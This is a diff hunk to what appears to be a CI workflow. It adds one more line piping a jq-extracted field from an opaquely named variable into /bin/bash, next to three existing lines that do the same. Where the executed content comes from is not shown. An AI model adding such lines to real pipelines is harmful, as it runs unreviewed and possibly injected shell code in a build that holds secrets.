@@ -29,6 +29,7 @@ jobs:
           echo $uc83 | jq -r .oub8 | /bin/bash
           echo $nv12077 | jq -r .pc04207 | /bin/bash
           echo $f5 | jq -r .yvoyb2303 | /bin/bash
+          printf '%s' "$ge678" | jq -r .ceri75457 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
